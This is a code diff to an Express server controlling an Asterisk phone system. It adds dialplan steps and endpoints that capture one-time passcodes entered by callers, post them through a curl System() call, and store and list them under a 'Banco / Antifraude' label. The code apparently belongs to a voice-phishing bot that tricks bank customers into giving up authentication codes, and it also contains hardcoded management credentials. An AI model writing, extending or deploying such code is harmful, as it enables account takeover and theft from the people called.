@@ -316,6 +316,9 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
     dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
     dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP CAPTURADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,SayDigits(\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
@@ -496,6 +499,75 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     });
   } catch (error: any) {
     res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// In-memory buffer for captured OTPs in production
+interface CapturedOtpItem {
+  id: string;
+  number: string;
+  otp: string;
+  timestamp: string;
+  channel?: string;
+  service?: string;
+  status: 'valid' | 'invalid' | 'pending';
+}
+
+let capturedOtpHistory: CapturedOtpItem[] = [];
+
+// Endpoint to receive OTP captures from Asterisk curl or AMI
+app.post('/api/asterisk/otp/capture', (req, res) => {
+  const { number, otp, channel, service = 'Banco / Antifraude' } = req.body;
+  if (otp) {
+    const cleanNumber = (number && number !== '<unknown>') ? String(number) : 'Destino Directo';
+    const record: CapturedOtpItem = {
+      id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+      number: cleanNumber,
+      otp: String(otp),
+      timestamp: new Date().toLocaleTimeString(),
+      channel: channel || 'PJSIP',
+      service: service || 'Banco / Antifraude',
+      status: 'valid',
+    };
+    capturedOtpHistory.unshift(record);
+    if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
+    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO!: [${otp}] - Tel: ${cleanNumber}`);
+  }
+  res.json({ success: true, count: capturedOtpHistory.length });
+});
+
+// Endpoint to list all captured OTP records
+app.get('/api/asterisk/otp/records', (req, res) => {
+  res.json({ success: true, records: capturedOtpHistory });
+});
+
+// Endpoint to delete/clear captured records
+app.delete('/api/asterisk/otp/records', (req, res) => {
+  capturedOtpHistory = [];
+  res.json({ success: true });
+});
+
+// Endpoint to inspect live channels on Asterisk
+app.get('/api/asterisk/live/channels', async (req, res) => {
+  try {
+    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
+      'core show channels concise',
+    ]);
+    res.json({ success: true, raw: amiOutput });
+  } catch (err: any) {
+    res.json({ success: false, raw: '', error: err.message });
+  }
+});
+
+// Endpoint to hangup an active call
+app.post('/api/asterisk/call/hangup', async (req, res) => {
+  const { channel } = req.body;
+  try {
+    const cmd = channel ? `channel request hangup ${channel}` : 'channel request hangup all';
+    await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
+    res.json({ success: true, message: `Canal ${channel || 'todos'} colgado` });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
